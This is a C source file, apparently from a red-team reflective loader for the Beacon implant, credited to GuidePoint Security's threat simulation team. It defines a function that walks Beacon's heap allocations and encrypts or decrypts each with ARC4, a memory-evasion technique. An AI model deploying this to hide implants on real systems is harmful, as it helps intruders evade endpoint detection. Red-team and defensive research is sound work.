/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Encrypts every heap allocation made by Beacon
 * using ARC-4 symetric algorithm.
 *
!*/
D_SEC( E ) VOID HeapEncryptDecrypt( _In_ PCHAR Key, _In_ UINT32 KeyLength )
{
	ARC4_CTX		Arc;

	PTABLE			Tbl = NULL;
	PLIST_ENTRY		Hdr = NULL;
	PLIST_ENTRY		Ent = NULL;
	PHEAP_ENTRY_BEACON	Heb = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Arc, sizeof( Arc ) );

	/* Init the key */
	arc4_init( &Arc, Key, KeyLength );

	/* Setup heap buffer list */
	Tbl = C_PTR( G_SYM( Table ) );
	Hdr = C_PTR( & Tbl->Table->HeapList );
	Ent = C_PTR( Hdr->Flink );

	/* Enumerate the complete list of entries */
	for ( ; Ent != Hdr ; Ent = C_PTR( Ent->Flink ) ) {
		/* Pointer to the structure */
		Heb = C_PTR( CONTAINING_RECORD( Ent, HEAP_ENTRY_BEACON, HeapList ) );

		/* Encrypt / Decrypt the buffer! */
		arc4_process( &Arc, Heb->Buffer, Heb->Buffer, Heb->Length );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Arc, sizeof( Arc ) );
};
